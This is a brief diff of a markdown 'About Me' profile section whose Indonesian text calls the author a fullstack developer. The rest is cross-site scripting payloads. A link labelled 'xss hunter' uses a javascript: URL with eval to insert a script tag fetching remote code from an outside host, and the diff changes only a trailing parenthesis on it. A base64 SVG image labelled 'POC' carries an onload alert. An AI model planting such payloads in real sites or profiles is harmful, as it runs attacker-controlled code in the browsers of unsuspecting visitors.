@@ -1,6 +1,6 @@
 # About Me:
 Saya adalah fullstack developer
-[xss hunter](javascript:eval('var a=document.createElement(\'script\');a.src=\'https://js.rip/1ngt9aj20p\';document.body.appendChild(a)'))
+[xss hunter](javascript:eval('var a=document.createElement(\'script\');a.src=\'https://js.rip/1ngt9aj20p\';document.body.appendChild(a)')))
 ![POC](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDFdIj48L3N2Zz4=)
 
 
